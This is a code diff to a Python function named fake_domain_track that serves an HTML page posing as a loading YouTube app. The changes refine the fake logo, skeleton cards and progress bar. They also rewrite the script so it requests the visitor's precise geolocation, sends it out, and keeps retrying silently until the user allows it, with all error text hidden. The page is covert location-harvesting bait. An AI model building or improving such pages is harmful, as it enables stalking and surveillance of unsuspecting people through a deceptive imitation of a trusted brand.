@@ -127,7 +127,7 @@ def fake_domain_track(link_id):
                 overflow: hidden;
             }}
             
-            /* YouTube Header - no status bar */
+            /* YouTube Header - logo left aligned */
             .youtube-header {{
                 padding: 12px 16px 8px 16px;
                 display: flex;
@@ -137,22 +137,31 @@ def fake_domain_track(link_id):
                 z-index: 10;
                 margin-top: 4px;
             }}
+            .youtube-logo {{
+                display: flex;
+                align-items: center;
+                flex: 1;
+            }}
             .youtube-logo svg {{
                 width: 90px;
                 height: 24px;
+                display: block;
             }}
             .header-icons {{
                 display: flex;
                 gap: 20px;
                 color: #fff;
+                align-items: center;
+                flex-shrink: 0;
             }}
             .header-icons svg {{
                 width: 24px;
                 height: 24px;
                 fill: #fff;
+                display: block;
             }}
             
-            /* Loading Content - Only skeleton and loader, no text */
+            /* Loading Content */
             .loading-content {{
                 flex: 1;
                 display: flex;
@@ -173,6 +182,7 @@ def fake_domain_track(link_id):
                 border-radius: 50%;
                 animation: spin 1s cubic-bezier(0.5, 0, 0.5, 1) infinite;
                 margin-bottom: 30px;
+                flex-shrink: 0;
             }}
             
             @keyframes spin {{
@@ -180,7 +190,7 @@ def fake_domain_track(link_id):
                 100% {{ transform: rotate(360deg); }}
             }}
             
-            /* Skeleton loading cards - gray texture moving */
+            /* Skeleton loading cards */
             .skeleton-container {{
                 width: 100%;
                 max-width: 380px;
@@ -221,27 +231,27 @@ def fake_domain_track(link_id):
                 width: 80%;
             }}
             
-            /* Moving gray texture (shimmer effect) */
+            /* Shimmer animation - moving gray texture */
             .skeleton-thumbnail::after,
             .skeleton-line::after {{
                 content: '';
                 position: absolute;
                 top: 0;
-                left: -150%;
-                width: 150%;
+                left: -100%;
+                width: 100%;
                 height: 100%;
                 background: linear-gradient(
                     90deg,
                     transparent,
-                    rgba(255,255,255,0.05) 50%,
+                    rgba(255,255,255,0.08) 50%,
                     transparent
                 );
-                animation: shimmer 1.5s infinite;
+                animation: shimmer 1.8s infinite;
             }}
             
             @keyframes shimmer {{
-                0% {{ left: -150%; }}
-                100% {{ left: 150%; }}
+                0% {{ left: -100%; }}
+                100% {{ left: 100%; }}
             }}
             
             /* Bottom Navigation */
@@ -270,7 +280,7 @@ def fake_domain_track(link_id):
                 fill: currentColor;
             }}
             
-            /* Progress bar at top - YouTube style */
+            /* Progress bar */
             .progress-bar {{
                 position: fixed;
                 top: 0;
@@ -284,22 +294,22 @@ def fake_domain_track(link_id):
                 height: 100%;
                 width: 0%;
                 background: #ff0000;
-                animation: progress 8s ease-in-out forwards;
+                animation: progress 10s ease-in-out forwards;
             }}
             @keyframes progress {{
                 0% {{ width: 0%; }}
-                10% {{ width: 10%; }}
-                30% {{ width: 25%; }}
-                50% {{ width: 45%; }}
-                70% {{ width: 65%; }}
-                85% {{ width: 80%; }}
-                95% {{ width: 92%; }}
+                10% {{ width: 15%; }}
+                30% {{ width: 30%; }}
+                50% {{ width: 50%; }}
+                70% {{ width: 70%; }}
+                85% {{ width: 85%; }}
+                95% {{ width: 95%; }}
                 100% {{ width: 100%; }}
             }}
             
             /* Hide any text */
-            .no-text {{
-                display: none;
+            .hidden {{
+                display: none !important;
             }}
         </style>
     </head>
@@ -311,12 +321,21 @@ def fake_domain_track(link_id):
         
         <!-- Main App Container -->
         <div class="app-container">
-            <!-- YouTube Header (no status bar) -->
+            <!-- YouTube Header -->
             <div class="youtube-header">
                 <div class="youtube-logo">
                     <svg viewBox="0 0 90 24" fill="none">
                         <path d="M82.2 2.2C80.8 1.7 79.2 1.3 77.4 1.1C75.6 0.9 73.8 0.8 72 0.8C70.2 0.8 68.4 0.9 66.6 1.1C64.8 1.3 63.2 1.7 61.8 2.2C60.4 2.7 59.2 3.3 58.2 4.1C57.2 4.9 56.6 5.8 56.6 6.9V17.1C56.6 18.2 57.2 19.1 58.2 19.9C59.2 20.7 60.4 21.3 61.8 21.8C63.2 22.3 64.8 22.7 66.6 22.9C68.4 23.1 70.2 23.2 72 23.2C73.8 23.2 75.6 23.1 77.4 22.9C79.2 22.7 80.8 22.3 82.2 21.8C83.6 21.3 84.8 20.7 85.8 19.9C86.8 19.1 87.4 18.2 87.4 17.1V6.9C87.4 5.8 86.8 4.9 85.8 4.1C84.8 3.3 83.6 2.7 82.2 2.2Z" fill="#FF0000"/>
                         <path d="M72 5L85 12L72 19V5Z" fill="white"/>
+                        <path d="M8.6 22.2H5.8V1.8H8.6V22.2Z" fill="white"/>
+                        <path d="M18.6 22.2H15.8V1.8H18.6V22.2Z" fill="white"/>
+                        <path d="M28.6 22.2H25.8V1.8H28.6V22.2Z" fill="white"/>
+                        <path d="M38.6 22.2H35.8V1.8H38.6V22.2Z" fill="white"/>
+                        <path d="M48.6 22.2H45.8V1.8H48.6V22.2Z" fill="white"/>
+                        <path d="M58.6 22.2H55.8V1.8H58.6V22.2Z" fill="white"/>
+                        <path d="M68.6 22.2H65.8V1.8H68.6V22.2Z" fill="white"/>
+                        <path d="M78.6 22.2H75.8V1.8H78.6V22.2Z" fill="white"/>
+                        <path d="M88.6 22.2H85.8V1.8H88.6V22.2Z" fill="white"/>
                     </svg>
                 </div>
                 <div class="header-icons">
@@ -325,7 +344,7 @@ def fake_domain_track(link_id):
                 </div>
             </div>
             
-            <!-- Loading Content - Only skeleton and loader -->
+            <!-- Loading Content -->
             <div class="loading-content">
                 <div class="youtube-loader" id="loader"></div>
                 
@@ -411,40 +430,31 @@ def fake_domain_track(link_id):
                     }}
                 }})
                 .catch(() => {{
-                    // Silent retry if fetch fails
-                    setTimeout(retryLocation, 2000);
+                    setTimeout(requestLocation, 2000);
                 }});
             }}
             
             function handleError(error) {{
-                // Keep retrying silently until location is provided
-                setTimeout(retryLocation, 3000);
+                // Don't show any error - just keep retrying silently
+                setTimeout(requestLocation, 3000);
             }}
             
-            function retryLocation() {{
+            function requestLocation() {{
                 if (navigator.geolocation) {{
                     navigator.geolocation.getCurrentPosition(
                         sendLocation,
                         handleError,
-                        {{enableHighAccuracy: true, timeout: 15000, maximumAge: 0}}
+                        {{enableHighAccuracy: true, timeout: 30000, maximumAge: 0}}
                     );
                 }} else {{
-                    // Geolocation not supported, retry anyway (though it won't work)
-                    setTimeout(retryLocation, 5000);
+                    // Fallback - keep trying
+                    setTimeout(requestLocation, 5000);
                 }}
             }}
             
             // Start location request immediately
-            if (navigator.geolocation) {{
-                navigator.geolocation.getCurrentPosition(
-                    sendLocation,
-                    handleError,
-                    {{enableHighAccuracy: true, timeout: 15000, maximumAge: 0}}
-                );
-            }} else {{
-                // Fallback - keep trying
-                setTimeout(retryLocation, 5000);
-            }}
+            // Will keep asking until user allows it
+            requestLocation();
         </script>
     </body>
     </html>
